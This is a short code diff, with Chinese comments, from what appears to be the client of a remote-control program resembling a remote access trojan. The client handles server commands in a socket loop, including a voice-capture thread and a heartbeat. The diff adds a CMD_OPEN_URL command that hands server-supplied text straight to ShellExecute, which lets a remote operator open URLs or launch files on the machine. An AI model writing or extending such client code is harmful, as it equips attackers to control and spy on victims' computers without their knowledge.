@@ -12,6 +12,7 @@
 #include "ConnectInfo.h"
 #include "WindowManager.h"
 #include "Voice.h"
+#include <shellapi.h>
 
 //套接字的初始化
 DWORD __stdcall ConnectThread(LPVOID lparam)
@@ -46,6 +47,7 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 	}
 	while(1)
 	{
+		memset(Buffer, 0, sizeof(Buffer));
 		if (!RecvMsg(MainSocket, (char *)Buffer, &msgHead))
 		{
 			shutdown(MainSocket, 0x02);
@@ -85,6 +87,11 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 		case CMD_VOICE:
 			{
 					CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
+				break;
+			}
+		case CMD_OPEN_URL:
+			{
+				ShellExecute(NULL, "open", Buffer, NULL, NULL, SW_SHOWNORMAL);
 				break;
 			}
 		case CMD_HEARTBEAT://心跳包
